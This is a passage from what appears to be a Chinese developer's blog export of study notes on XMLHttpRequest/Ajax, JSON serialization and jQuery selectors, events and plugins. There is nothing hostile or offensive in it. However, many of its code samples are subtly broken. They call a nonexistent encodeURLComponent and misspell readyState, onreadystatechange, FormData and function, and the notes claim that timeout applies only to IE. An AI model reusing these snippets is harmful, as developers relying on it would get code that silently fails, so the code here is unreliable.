xhr.setRequestHeader(‘Content-Type’,’application/x-www-form-urlencoded’); get请求可以不设置 请求主体 xhr.send(“name=xjj&amp;age=10”); get 请求方式可以传空 1234567891011121314151617181920// 适用于 IE7 之前的版本 function createXHR() &#123; if (typeof arguments.callee.activeXString != "string") &#123; var versions = [ "MSXML2.XMLHttp.6.0", "MSXML2.XMLHttp.3.0", "MSXML2.XMLHtt" ], i, len; for (i = 0, len = versions.length; i &lt; len; i++) &#123; try &#123; new ActiveXObject(versions[i]); arguments.callee.activeXString = versions[i]; break; &#125; catch (ex) &#123; // 跳过 &#125; &#125; &#125; return new ActiveXObject(arguments.callee.activeXString); &#125; IE7+、FireFox、Opera、Chrome、Safari 都支持原生的 XHR 对象。 1var xhr = new XMLHttpRequest(); 封装获取 xhr 对象的函数 12345678910111213141516171819202122232425function createXHR() &#123; if (typeof XMLHttpRequest != "undefined") &#123; return new XMLHttpRequest(); &#125; else if (typeof ActiveXObject != "undefined") &#123; if (typeof arguments.callee.activeXString != "string") &#123; var versions = [ "MSXML2.XMLHttp.6.0", "MSXML2.XMLHttp.3.0", "MSXML2.XMLHtt" ], i, len; for (i = 0, len = versions.length; i &lt; len; i++) &#123; try &#123; new ActiveXObject(versions[i]); arguments.callee.activeXString = versions[i]; break; &#125; catch (ex) &#123; // 跳过 &#125; &#125; &#125; return new ActiveXObject(arguments.callee.activeXString); &#125; else &#123; throw new Error ("No XHR object is available"); &#125;&#125; XMLHttpRequest 对象使用 open() 方法 三个参数： 要发送的请求的类型：(“get”, “post”) 请求的 URL ，是相对于执行代码的当前页面（也可以使用绝对路径） 表示是否异步发送请求的布尔值 只能想用一个域中使用相同端口和协议的 URL 发送请求。如果 URL 与启动请求的页面有任何差别，都会发生安全错误。 12xhr.open("get", "exam.php", false);xhr.send(null); send() 方法 一个参数，请求主题发送的数据 如果不需要请求主体发送数据，必须传入 null 值，调用完之后请求就发会被分派到服务器。 由于这次请求是同步的，JavaScript 代码会等到服务器响应之后再继续执行。在收到响应后 ，响应的数据会自动填充 XHR 对象的属性。属性说明如下： responseText: 作为响应主体被返回的文本。 responseXML: 如果响应的内容是 “text/xml” 或 “application/xml”，这个属性中保存着响应数据的 XML DOM 文档。 status: 响应的 HTTP 状态。 statusText: HTTP 状态说明。 在收到响应后，第一步就是检查 status 属性，以确定响应已经成功返回。一般来说，可以将 状态代码为 200 作为成功的标志。此时，responseText 属性的内容已就绪，而且在内容正确的时候，responseXML 也能够访问了。此外，状态码为 304 表示请求的资源并没有被修改，可以直接使用浏览器缓存的版本；也意味着响应是有效的。因此，检查状态码： 1234567xhr.open("get", "exam.php", false);xhr.send(null);if ((xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300) || xhr.status == 304) &#123; console.log(xhr.responseText);&#125; else &#123; console.log("请求失败: " + xhr.status);&#125; 前面这样发送同步请求没有问题，但是发送异步请求时，才能让 JavaScript 继续执行而不必等待响应。可以通过检测 XHR对象的 readyState 属性，该属性表示请求/响应过程的当前活动阶段。该属性的取值： 0 未初始化，即尚未调用 open() 方法 1 启动，已经调用 open() 方法，但尚未调用 send() 2 发送，已经调用 send() 方法，但尚未接收到响应，请求已发送，正在处理中（通常现在可以从响应中获取内容头）。 3 接收，已经接收到部分响应数据，请求在处理中；通常响应中已有部分数据可用了，但是服务器还没有完成响应的生成。 4 完成，已经接收到全部响应数据，而且已经可以在客户端使用了 只要 readyState 属性的值由一个值变成另一个值，都会触发 readystatechange 事件。可以利用这个事件来检测每次状态变化后 readyState 值。通常，我们只对 readyState 值为 4 的阶段感兴趣，因为这时所有数据都已经就绪。不过，必须在调用 open() 之前指定 onreadystatechange 事件处理程序才能确保跨浏览器兼容性。代码如下：onreadystatechange 是 Javascript的 事件的一种，其意义在于监听 XMLHttpRequest 的状态 获取状态行（包括状态码&amp;状态信息） xhr.status 状态码; xhr.statusText 状态码信息 获取响应头 xhr.getResponseHeader(&#39;Content-Type&#39;); xhr.getAllResponseHeaders(); 响应主体 xhr.responseText; xhr.responseXML 123456789101112var xhr = createXHR();xhr.onreadystatechange = function() &#123; if (xhr.readState == 4) &#123; if ((xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300) || xhr.status == 304) &#123; console.log(xhr.responseText); &#125; else &#123; console.log("请求失败: " + xhr.status); &#125; &#125;&#125;;xhr.open("get", "exam.php", true);xhr.send(null); 在接收到响应之前还可以调用 abort() 方法来取消异步请求。 1xhr.abort(); setRequestHeader()方法可以设置自定义的请求头部信息。这个方法接收两个参数： 头部名称 头部字段的值 setRequestHeader()方法必须在调用 open() 方法之后，send() 方法之前调用. GET 请求GET 请求将查询的字符串参数追加到 URL 的末尾，传入 open() 方法的 URL 末尾的查询字符串必须经过正确的编码才行。 查询字符串中的每个值都必须经过 encodeURLComponent() 进行编码，然后才能放到 URL 末尾。 所有的名-值对都必须由（&amp;）符号分隔。如： 1xhr.open("get", "exam.php?name=value&amp;name=value2", true); 封装经过编码的查询字符串。 123456// 向 URL 末尾添加查询字符串的方法function addURLParam(url, name, value) &#123; url += (url.indexOf("?") == -1 ? "?" : "&amp;"); url += encodeURLComponent(name) + "=" + encodeURLComponent(value); return url;&#125; POST 请求通常用于向服务器发送应该保存的数据。POST 请求应该把数据作为请求的主体提交。给 open() 方法的第一个参数传入 “post” 就可以初始化一个 post 请求。 1xhr.open("post", "exam.php", true); 使用 XHR 来模仿表单提交：首先将 Content-Type 头部设置为 application/x-www-form-urlencoded ，也就是表单提交时的数据类型，其次是以适当的格式创建一个字符串。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485function submitData() &#123; var xhr = createXHR(); xhr.onreadstatechange = function() &#123; if (xhr.readyState == 4) &#123; if ((xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300) || xhr.status == 304) &#123; console.log(xhr.responseText); &#125; else &#123; console.log("请求失败: " + xhr.status); &#125; &#125; &#125;; xhr.open("post", "exam.php", true); xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); var form = document.getElementById("userInfo"); xhr.send(serialize(form));&#125;// 获取 XHR 对象的兼容方法function createXHR() &#123; if (typeof arguments.callee.activeXString != "string") &#123; var versions = [ "MSXML2.XMLHttp.6.0", "MSXML2.XMLHttp.3.0", "MSXML2.XMLHtt" ], i, len; for (i = 0, len = versions.length; i &lt; len; i++) &#123; try &#123; new ActiveXObject(versions[i]); arguments.callee.activeXString = versions[i]; break; &#125; catch (ex) &#123; // 跳过 &#125; &#125; &#125; return new ActiveXObject(arguments.callee.activeXString);&#125;// 表单序列化函数function serialize(form) &#123; var parts = [], field = null, i, len, j, optLen, option, optValue; for (i = 0, len = form.elements.length; i &lt; len; i++) &#123; field = form.elements[i]; switch(field.type) &#123; case "select-one": case "select-multipule": if (field.name.length) &#123; for (j = 0, optLen = field.options.length; j &lt; optLen; j++) &#123; option = field.options[j]; if (option.selected) &#123; optValue = ""; if (option.hasAttribute) &#123; optValue = (option.hasAttribute("value") ? option.value : option.text); &#125; else &#123; optValue = (option.attributes["values"].specified ? option.value : option.text); &#125; parts.push(encodeURLComponent(field.name) + "=" + encodeURLComponent(optValue)); &#125; &#125; &#125; break; case undefined: case "file": case "reset": case "submit": case "button": break; case "radio": case "checkbox": if (!field.name.length) &#123; break; &#125; default: if (field.name.length) &#123; parts.push(encodeURLComponent(field.name) + "=" + encodeURLComponent(field.value)); &#125; &#125; &#125; return parts.join("&amp;");&#125; 注：GET和POST请求方式的差异 GET没有请求主体，使用xhr.send(null) GET可以通过在请求URL上添加请求参数 POST可以通过xhr.send(‘name=itcast&amp;age=10’) POST需要设置 GET效率更好（应用多） GET大小限制约4K，POST则没有限制关于表单序列化 XMLHTTPRequest 2 级 定义了 FormData 类型。 FormData 为序列化表单以及创建与表单格式相同的数据。 12data new FormData();data.append("name", "Hiraku"); append() 方法传递两个参数。即键和值。也可以使用如下的方式： 1var data = new FormData(document.forms[0]); 创建了 FormData 的实例后，可以直接传递给 send() 方法： 1234567891011121314var xhr = createXHR();xhr.onreadstatechange = function() &#123; if (xhr.readyState == 4) &#123; if ((xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300) || xhr.status == 304) &#123; console.log(xhr.responseText); &#125; else &#123; console.log("请求失败: " + xhr.status); &#125; &#125;&#125;;xhr.open("post", "exam.php", true);xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");var form = document.getElementById("userInfo");xhr.send(new FormDta(form)); 超时设定123456789101112131415161718192021var xhr = createXHR();xhr.onreadstatechange = function() &#123; try &#123; if (xhr.readyState == 4) &#123; if ((xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300) || xhr.status == 304) &#123; console.log(xhr.responseText); &#125; else &#123; console.log("请求失败: " + xhr.status); &#125; &#125; &#125; catch (e) &#123; // 由 ontimeout 事件程序处理 &#125; &#125;;xhr.open("get", "exam.php", true);xht.timeout = 1000; // 仅适用于 IExhr.ontimeout = funciton() &#123; console.log("请求失败：")&#125;xhr.send(null); 进度事件 loadstart: 收到响应数据的第一个字节时触发 progress：在接收响应期间不断地触发 error: 发生错误时触发 abort: 调用 abort() 方法而终止时触发 load: 在接收到完整的响应数据时触发 loadend: 在通信完成或者触发 error、abort、或 load 事件后触发。 我们需要检测并判断响应头的 MIME 类型后确定使用 request.responseText 或者 request.responseXML API 总结 xhr.open() 发起请求，可以是get、post方式 xhr.setRequestHeader() 设置请求头 xhr.send() 发送请求主体get方式使用xhr.send(null) xhr.onreadystatechange = function () {} 监听响应状态 xhr.status 表示响应码，如200 xhr.statusText 表示响应信息，如OK xhr.getAllResponseHeaders() 获取全部响应头信息 xhr.getResponseHeader(&#39;key&#39;) 获取指定头信息 xhr.responseText、xhr.responseXML 都表示响应主体 封装ajax工具函数12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182/* * 1. 请求的类型 type get post * 2. 请求地址 url * 3. 是异步的还是同步的 async false true * 4. 请求内容的格式 contentType * 5. 传输的数据 data json对象 * 6. 响应成功处理函数 success function * 7. 响应失败的处理函数 error function * 这些都是动态参数 参数对象 options * */window.$ = &#123;&#125;;/*封装一个函数*//*申明一个ajax的方法*/$.ajax = function(options)&#123; if(!options || typeof options != 'object')&#123; return false; &#125; /*请求的类型*/ var type = options.type || 'get';/*默认get*/ /*请求地址 */ var url = options.url || location.pathname;/*当前的地址*/ /*是异步的还是同步的 */ var async = (options.async === false)?false:true;/*默认异步*/ /*请求内容的格式 */ var contentType = options.contentType || "text/html"; /*传输的数据 */ var data = options.data || &#123;&#125;;/*｛name:'',age:''｝*/ /*在提交的时候需要转成 name=xjj 这种格式*/ var dataStr = ''; /*数据字符串*/ for(var key in data)&#123; dataStr += key+'='+data[key]+'&amp;'; &#125; dataStr = dataStr &amp;&amp; dataStr.slice(0,-1); /*ajax 编程*/ var xhr = new XMLHttpRequest(); /*请求行*/ /*(type=='get'?url+'?'+dataStr:url)判断当前的请求类型*/ xhr.open(type,(type=='get'?url+'?'+dataStr:url),async); /*请求头*/ if(type == 'post')&#123; xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded'); &#125; /*请求主体*/ /*需要判断请求类型*/ xhr.send(type=='get'?null:dataStr); /*监听响应状态的改变 响应状态*/ xhr.onreadystatechange = function()&#123; /*请求响应完成并且成功*/ if(xhr.readyState == 4 &amp;&amp; xhr.status == 200)&#123; /*success*/ var data = ''; var contentType = xhr.getResponseHeader('Content-Type'); /*如果我们服务器返回的是xml*/ if(contentType.indexOf('xml') &gt; -1)&#123; data = xhr.responseXML; &#125; /*如果我们的服务器返回的是json字符串*/ else if(contentType.indexOf('json') &gt; -1)&#123; /*转化json对象*/ data = JSON.parse(xhr.responseText); &#125; /*否则的话他就是字符串*/ else&#123; data = xhr.responseText; &#125; /*回调 成功处理函数*/ options.success &amp;&amp; options.success(data); &#125; /*计时请求xhr.status不成功 他也需要的响应完成才认作是一个错误的请求*/ else if(xhr.readyState == 4)&#123; /*error*/ options.error &amp;&amp; options.error('you request fail !'); &#125; &#125;&#125;$.post = function(options)&#123; options.type = 'post'; $.ajax(options);&#125;$.get = function(options)&#123; options.type = 'get'; $.ajax(options);&#125; jQuery的ajaxjQuery为我们提供了更强大的Ajax封装 $.ajax({}) 可配置方式发起Ajax请求 $.get() 以GET方式发起Ajax请求 $.post() 以POST方式发起Ajax请求 $(&#39;form&#39;).serialize() 序列化表单（即格式化key=val&amp;key=val） url 接口地址 type 请求方式 timeout 请求超时 dataType 服务器返回格式 contentType 指定请求的 HTTP Content-Type data 发送请求数据 beforeSend: function () {} 请求发起前调用 success 成功响应后调用 error 错误响应时调用 complete 响应完成时调用（包括成功和失败） timeout 超时时间 cache 对于 GET 请求 ifModified 当为 true 时，jQuery 会为请求的每一个 URL 记录 Last-Modified 和 If-None-Match 响应头的值 global 是否触发上面描述的 Ajax 请求过程中的事件 jQuery Ajax介绍]]></content>
      <categories>
        <category>Ajax系列</category>
      </categories>
      <tags>
        <tag>Ajax</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JSON数据]]></title>
    <url>%2F2015%2F12%2F06%2FJSON%E6%95%B0%E6%8D%AE%2F</url>
    <content type="text"><![CDATA[JSON (JavaScript Object Notion, JavaScript 对象表示法) JSON 是 JavaScript 的一个严格的子集，它是一种数据格式，而不是一种编程语言。 语法JSON 语法可以表示以下三种类型的值： 简单值：使用 JavaScript 相同的语法，可以在 JSON 中表示字符串、数值、布尔值和 null，不支持 undefined。 对象：对象作为一种复杂数据类型，表示的是一组无序的键值对的值，每个键值对的值可以是简单类型，也可以是复杂类型。 数组：数组也是一种复杂数据类型，表示一组有序的值的列表，可以通过数值索引来访问其中的值。数组的值也可以是任意类型-简单值、对象或数组。 JSON 对象不支持变量、函数或对象实例，它就是一种表示数据结构化的数据的格式，虽然与 JavaScript 中表示数据的某些语法相同，但它并不局限于 JavaScript 的范畴 简单值 5 这是 JSON 表示数值 5 的方式。 “str” 这是 JSON 表示字符串的方式。 对象1234var person = &#123; name: "Hiraku", age: 25&#125; 用 JSON 表示为： 1234&#123; "name": "Hiraku", "age": 25&#125; 又如： 1234567891011121314&#123; "name": "Hiraku", "age": 25, "school": [ &#123; "name": "Shantou University", "location": "Guangdong" &#125;, &#123; "name": "Technology of LanZhou University", "location": "Gansu" &#125; ]&#125; 数组JSON 中的复杂数据是数组。 JSON 数组采用的就是 JavaScript 中的数字字面量的形式。 如： 1[25, "Hiraku", 0]; JSON 数组也没有变量和分号。把数组和对象结合起来，可以构成更复杂的数据集合。 如： 12345678910111213141516171819202122232425262728[ &#123; "title": "JavaScript", "authors": [ "Hirkau", "Herscharl" ], "edition": 3, "year": 2013 &#125;, &#123; "title": "HTML", "authors": [ "HuangShan", "Jack" ], "edition": 1, "year": 2012 &#125;, &#123; "title": "Java", "authors": [ "TangTang" ], "edition": 2, "year": 2015 &#125;,] JSON 解析和序列化JSON 数据可以解析为 JavaScript 对象优势及其明显。 JSON 对象eval() 函数可以解析、解释并返回 JavaScript 对象和数组。 两个重要方法： JSON.stringify() 把 JavaScript 对象序列化为 JSON 字符串 JSON.parse() 把 JSON 字符串解析为原生的 JavaScript 值 JSON.stringify() 详解出来要序列化的 JavaScript 对象外，还可以接收另外两个参数，这两个参数用于指定以不同方式序列化 JavaScript 对象。第一个参数是个过滤器，可以是一个数组，也可以是一个函数，第二个参数是一个选择，表示是否在 JSON 字符串中保留缩进。 第二个参数是数组： 1234567891011var book = &#123; "title": "JavaScript", "authors": [ "Hirkau", "Herscharl" ], "edition": 3, "year": 2013&#125;var jsonText = JSON.stringify(book, ["title", "edition"]);console.log(jsonText); // &#123;"title":"JavaScript","edition":3&#125; 第二个参数是函数： 12345678910111213141516171819202122var book = &#123; "title": "JavaScript", "authors": [ "Hirkau", "Herscharl" ], "edition": 3, "year": 2013&#125;var jsonText = JSON.stringify(book, function(key, value) &#123; switch(key)&#123; case "authors": return value.join(","); case "year": return "year"; case "edition": return undefined; default : return value; &#125; &#125;);console.log(jsonText); // &#123;"title":"JavaScript","authors":"Hirkau,Herscharl","year":"year"&#125; 第三个参数控制结果中的缩进和空白符：最大缩进空格为 10 。 1234567891011var book = &#123; "title": "JavaScript", "authors": [ "Hirkau", "Herscharl" ], "edition": 3, "year": 2013&#125;var jsonText = JSON.stringify(book, null, 4);console.log(jsonText); 这段代码输出结果是： 123456789&#123; "title": "JavaScript", "authors": [ "Hirkau", "Herscharl" ], "edition": 3, "year": 2013&#125; 第三个参数是字符时： 1234567891011var book = &#123; "title": "JavaScript", "authors": [ "Hirkau", "Herscharl" ], "edition": 3, "year": 2013&#125;var jsonText = JSON.stringify(book, null, " - -");console.log(jsonText); 输出结果： 123456789&#123; - -"title": "JavaScript", - -"authors": [ - - - -"Hirkau", - - - -"Herscharl" - -], - -"edition": 3, - -"year": 2013&#125; toJSON() 方法在 JSON.stringify() 方法不能满足某些独享进行自定义序列化的需求。可以给对象定义 toJSON() 方法，返回自身的 JSON 数据格式。 1234567891011121314var book = &#123; "title": "JavaScript", "authors": [ "Hirkau", "Herscharl" ], "edition": 3, "year": 2013, toJSON: function() &#123; return this.title; &#125;&#125;var jsonText = JSON.stringify(book);console.log(jsonText); // "JavaScript" 序列化的顺序： (1) 如果存在 toJSON() 方法而且能通过它取得有效的值，则调用该方法，否则，返回对象本身； (2) 如果提供了第二个参数，应用这个函数过滤器，传入函数过滤器的值是第 (1) 步返回的值； (3) 对第 (2) 步返回的每个值进行相应的序列化； (4) 如果提供了第三个参数，执行相应的序列化。 解析选项JSON.parse() 方法也可以接收另一个参数，该参数是一个函数，将在每个键值对上调用。为了区别 JSON.stringify() 接收的替换(过滤)函数，这个函数被称为还原函数，实际上这两个函数的签名是相同的-接收两个参数，一个键和一个值，而且都需要返回一个值。 12345678910111213141516171819var book = &#123; "title": "JavaScript", "authors": [ "Hirkau", "Herscharl" ], "edition": 3, "year": 2013, releaseDate: new Date(2011, 11, 1)&#125;var jsonText = JSON.stringify(book);var bookCopy = JSON.parse(jsonText, function(key, value) &#123; if (key == "releaseDate") &#123; return new Date(value); &#125; else &#123; return value; &#125;&#125;);console.log(bookCopy.releaseDate.getFullYear()); // 2011]]></content>
      <categories>
        <category>JSON系列</category>
      </categories>
      <tags>
        <tag>JSON</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery]]></title>
    <url>%2F2015%2F11%2F28%2FjQuery%2F</url>
    <content type="text"><![CDATA[使用 CSS 选择器来识别一组文档元素，并返回一个对象表示这些元素。返回的对象提供了大量的方法来批量操作匹配的元素。 jQuery前戏js不足 代码很麻烦，冗余 浏览器兼容性问题 入口函数只能写一个，写了多个，后面的会覆盖前面的问题 js的代码容错性比较差（比较容易出错） 实现一些简单的动画比较麻烦 什么是jquery？jquery是一个js库。jquery就是一个js文件. 什么是js库？js库其实就是把一些我们常用到的方法封装到一个单独的js文件里面，当我们想用的时候，引入它。（common.js animate.js） 特点： 丰富强大的语法 高效的查询 一套有用的方法 强大的函数式编程技巧，批量操作元素集 简洁的语言用法 引包1&lt;script src="jquery-1.12.4.js"&gt;&lt;/script&gt; 全局函数jQuery() 全局函数，对应于一个快捷名：$。jQuery() 是工厂函数，不使用 new 关键字。 入口函数js入口函数1window.onload = function () &#123;...&#125;; jQuery入口函数11$(document).ready(function () &#123;...&#125;); jQuery入口函数2（简化）1$(function () &#123;...&#125;); $符实质 $实质是一个函数，jQuery 对象是类数组对象。 参数是 function 、把 dom 元素 document 转成 jQuery 对象，选择器 jQuery 的调用方式 第一种：传递 CSS 选择器（字符串）给 $() 方法。 选择器支持大部分 CSS3 选择器，也有自己扩展的。返回当前文档中匹配该选择器的元素集合。还可以将一个 jQuery 对象作为第二个参数传递给 $() 方法，返回该特定元素或元素子元素中匹配选择器的部分。第二个元素可选的。 第二种：传递一个 Element、Document 或 Window 对象给 $() 方法。将传入的内容封装成 jQuery 对象。 第三种：传递 HTML 文本字符串，会根据传入的文本创建好 HTML 元素并封装为 jQuery 对象返回。可以接收第二个参数，可以传递 Document 对象来指定与所创建元素相关联的文档。第二个参数还可以是 object 对象。 第四中：传入函数。 一些基础方法 size() 代替 length get() 代替方括号索引 toArray() 将 jQuery 对象转成真正数组 each() 遍历，代替 for 循环 参数是回调函数，回调函数中的 this 指向遍历的元素，是原生的 DOM 对象。 还可以将索引，该元素传递给回调函数的第一个和第二个参数，第二个参数也是 DOM 对象。 返回调用自身的 jQuery 对象，可以用于链式编程 map() 和 Array.prototype.map() 方法很接近。 接收回调函数作为参数； 索引是回调函数的第一个参数，元素作为 this 值和回调函数的第二个参数。 如果回调函数返回 null 或 undefined，索引忽略。 回调函数返回数组或者伪数组 map() 返回的 jQuery 对象可以不包括文档元素，但依旧可以像伪数组对象一样使用。 index() 接收一个参数，返回该元素在 jQuery 对象中的索引值。找不到返回 -1. is() 接收一个选择器，选中元素至少有一个匹配该选择器，返回 true。 jQuery 对象的三个属性 selector 选择器字符串 context 传递给 $() 的第二个参数 jquery jQuery 的版本号 选择器基本选择器 ID选择器 $(&quot;#id名&quot;); 类选择器 $(&quot;.类名&quot;); 标签选择器 $(&quot;标签名&quot;); 并集选择器 $(&quot;#curr,.cls&quot;); 交集选择器 $(&quot;li.cls&quot;); 层级选择器 子代选择器 $(&quot;#curr&gt;.cls&quot;) 后代选择器 $(&quot;li cls&quot;) 过滤选择器 :odd; :even; :eq(0); jQuery对象 方法 $(this).css(&quot;backgroundColor&quot;, &quot;pink&quot;).siblings(&quot;li&quot;).css(&quot;backgroundColor&quot;, &quot;&quot;); 链式编程 $(this).find(&quot;li&quot;).css(&quot;backgroundColor&quot;, &quot;&quot;); css({}); css设置样式 siblings(); 兄弟元素 find(); 后代元素 next(); 下一个兄弟元素 parent(); 父元素 show(); 显示 hide(); 隐藏 index(); 获取的是当前对象在它兄弟里面的索引/ eq(0); 取到的是jQuery对象 隐式迭代 设置属性的操作的时候设置的是所有的元素 获取性操作不去遍历，直接获取第一个 类操作 添加类 addClass(); 类名 移除类 removeClass(); 类名 判断类 hasClass(); 类名 切换 toggle(); 类名，两个类名之间切换操作 动画显示、隐藏 show(); hide(); toggle(); 参数speed,值为毫秒值 淡入、淡出 fadeIn(); fadeIn(); fadeToggle()； 不传参数的时候，有动画，normal; 滑入、滑出 slideUp(); slideUp(); slideToggle()； 不传参数的时候，有动画，normal; 自定义动画1$("#box").animate(&#123;"width":"400px","height":"400px", "left":"400px"&#125;,speed,easing); 停止动画 stop(); stop(clearQueue, jumpToEnd); 第一个参数是否清除动画队列 true, false，默认false;第二个参数是是否跳转到当前动画的最终效果 true, false jQuery和js节点操作js节点操作1234var box = document.getElementById("box");aNode.document.createElement("a");box.appendChild(aNode);aNode.innerHTML = "innerHtml"; jQuery 操作 append(); 添加节点 appendTo() 添加节点 prepend(); 添加节点 prependTo() 添加节点 after(); 添加节点 before(); 添加节点 insertAfter() 插入节点 insertBefore() 插入节点 replaceWith() 替换 add() 添加 first() 仅包含选中元素的第一个 eq() 只包含指定序号的单个元素 html(); 不传参获取，传参设置 text(); 不传参获取，传参设置 empty(); 清空节点（清理门户） remove(); 删除节点（自杀） clone(); 深度复制，不复制事件 clone(true); 深度复制，并且复制事件 val(); 获取值 val(&quot;abc&quot;); 设置值 next() 下一个节点 prev() 上一个节点 prevAll() 前面所有节点 nextAll() 后面所有节点 parent() 父节点 sibling() 兄弟节点 find() 后代节点 filer() 返回符合条件的jQuery对象 not() 排除元素 has() 是否有 gt() 参数是数字，返回大于参数的后面的元素 wrap() 包装每一个 wrapInner() 包装每一个元素的内容 wrapOuter() 将选中元素作为一组包装 jQuery属性操作 setAttribute(&quot;target&quot;, &quot;_blank&quot;); attr(&quot;title&quot;, &quot;星期四&quot;); 用法和css用法是一样 attr(name, value); 用法和css用法是一样 attr({json}); 用法和css用法是一样 css() 传入一个字符串参数，获取对应样式，注意，不能传入复合样式的属性，如 “font” 传入两个参数，设置样式 传入一个对象，设置样式 jQuery属性操作特例布尔类型的属性：true false checked selected disabled 在jquery里面，碰到布尔类型的属性的时候，不要用attr方法，应该prop方法 prop(&quot;checked&quot;); 用法和css用法是一样 jQuery获取属性值width系列（操作尺寸） width(); 能获取、设置 Innerwidth(); 获取内部宽度（包括宽度和padding） Outerwidth(); 获取内部宽度（包括宽度和padding和border） Outerwidth(true); 获取内部宽度（包括宽度和padding和border和margin） height(); 能获取、设置 Innerheight(); 获取内部高度（包括高度和 padding） Outerheight(); 获取内部高度（包括高度和 padding 和 border） Outerheight(true); 获取内部高度（包括高度和 padding 和 border 和 margin） jQuery操作坐标 position(); 只能获取不能设置，设置用 css 设置，找最近的有相对定位的的父盒子 offset(); 相对与dom最左上角（获取、设置） 带有 left 属性和 top 属性 offsetParent() 最近定位的祖先元素 scrollTop(); 设置卷去的距离（事件） scrollLeft(); 设置卷去的距离（事件） 1234$(window).scroll(function () &#123; $(this).scrollTop(); $(this).scrollLeft();&#125;); 获取和设置 CSS 类 addClass() 添加类 removeClass() 删除类 toggleClass() 没有类则添加，否则删除 hasClass() 判断是否存在 设置或获取元素内容 html() 不传参获取 传参设置值，html格式字符串 text() 不传参获取 传参设置值，纯文本jQuery事件 事件机制： 用户执行某一个操作，浏览器会相应用户的操作，执行某个函数 事件处理函数： 所谓的事件处理函数，就是响应用户的那个函数 用户事件： 就是事件名，用户可以注册的事件 注册事件： 就是赋值或调用addEventListener 响应事件： 做完操作调用某个方法 jQuery事件发展 简单事件绑定：不能同时注册两个事件 bind事件绑定 1234567$("p").bind(&#123; "click": function () &#123; alert("我执行了click"); &#125;,"mouseenter": function () &#123; alert("我执行了mouseenter"); &#125;&#125;); 不支持动态创建元素 delegate事件（委托、委派、代理） 123$("div").delegate("p", "click", function () &#123; alert("我执行了委托事件");&#125;); on事件绑定1234567/*on给div注册委托事件*/$("div").on("click", "p", function () &#123;&#125;); /*on给div注册普通的点击事件*/$("div").on("click", function () &#123; alert("我触发了div本身的事件");&#125;); 解除事件绑定123456/*off是解除所有的事件,能解除委托事件*/$("div").off();/*解除click事件*/$("div").off("click");/*解除委托的click事件*/$("div").off("click","**"); 事件触发 trigger(&quot;focus&quot;); 触发获取焦点事件，会触发浏览器默认行为 triggerHandler(&quot;focus&quot;); 触发获取焦点事件，不会触发浏览器默认行为 事件对象event click(function(event){...}); 点击 keyCode = event.keyCode; 键盘码 阻止事件冒泡方法1： event.stopPropagation(); 方法2： return false; 阻止浏览器的默认行为方法1： event.preventDefault(); 方法2： return false; 事件 click(function(){...}); 点击 scroll(function(){...}); 鼠标滚轮事件 focus(function(){...}); 获取焦点 mouseenter(function(){...}); 鼠标经过 mouseleave(function(){...}); 鼠标离开 keydown(function(event){var keyCode = event.keyCode;}); 键盘按键按下 keyup(function(event){var keyCode = event.keyCode;}); 键盘抬起 浏览器提供的事件123456789101112131415161718"onabort", "onblur", "oncancel", "oncanplay", "oncanplaythrough", "onchange", "onclick", "onclose","oncontextmenu", "oncuechange", "ondblclick", "ondrag", "ondragend", "ondragenter", "ondragleave", "ondragover","ondragstart", "ondrop", "ondurationchange", "onemptied","onended", "onerror", "onfocus", "oninput", "oninvalid", "onkeydown", "onkeypress", "onkeyup", "onload","onloadeddata", "onloadedmetadata", "onloadstart", "onmousedown", "onmouseenter", "onmouseleave", "onmousemove", "onmouseout", "onmouseover", "onmouseup", "onmousewheel", "onpause", "onplay", "onplaying", "onprogress", "onratechange", "onreset", "onresize", "onscroll", "onseeked", "onseeking", "onselect", "onshow", "onstalled", "onsubmit", "onsuspend", "ontimeupdate", "ontoggle", "onvolumechange", "onwaiting", "onbeforecopy", "onbeforecut", "onbeforepaste", "oncopy", "oncut", "onpaste", "onsearch", "onselectstart", "onwheel", "onwebkitfullscreenchange", "onwebkitfullscreenerror" 迭代12345678910/*显式迭代：对每一个元素做不同的处理*/for (var i = 0; i &lt; $("li").length; i++) &#123; var target = (i + 1) / 10; $("li").eq(i).css("opacity", target);&#125;/*each();*/$("li").each(function (index, element) &#123; var target = (index + 1) / 10; $(element).css("opacity", target);&#125;); 插件懒加载插件123456&lt;img class="lazy" data-original="23.jpg" alt=""&gt;&lt;script src="jquery-1.12.4.js" type="text/javascript"&gt;&lt;/script&gt;&lt;script src="plugins/jquery.lazyload.js" type="text/javascript"&gt;&lt;/script&gt;&lt;script&gt; $(function () &#123;$("img.lazy").lazyload();&#125;);&lt;/script&gt; fullpage插件引入文件1234&lt;link rel="stylesheet" href="css/jquery.fullPage.css"&gt;&lt;script src="js/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="js/jquery-ui.min.js"&gt;&lt;/script&gt;&lt;script src="js/jquery.fullPage.js"&gt;&lt;/script&gt; html1234567891011&lt;div id="fullpage"&gt; &lt;div class="section"&gt;第一屏&lt;/div&gt; &lt;div class="section"&gt;第二屏&lt;/div&gt; &lt;div class="section"&gt; &lt;div class="slide"&gt;第三屏的第一屏&lt;/div&gt; &lt;div class="slide"&gt;第三屏的第二屏&lt;/div&gt; &lt;div class="slide"&gt;第三屏的第三屏&lt;/div&gt; &lt;div class="slide"&gt;第三屏的第四屏&lt;/div&gt; &lt;/div&gt; &lt;div class="section"&gt;第四屏&lt;/div&gt;&lt;/div&gt; js1234567891011$(function()&#123; $('#fullpage').fullpage(&#123; 'verticalCentered': false, 'css3': true, 'sectionsColor': ['#254875', '#00FF00', '#254587', '#695684'], anchors: ['page1', 'page2', 'page3', 'page4'], 'navigation': true, 'navigationPosition': 'right', 'navigationTooltips': ['fullPage.js', 'Powerful', 'Amazing', 'Simple'] &#125;);&#125;); 可选配置 选项 方法 回调函数 jqueryUI插件jqueryUI插件 官网 引入文件123&lt;link rel="stylesheet" href="plugins/jquery-ui.css" /&gt;&lt;script 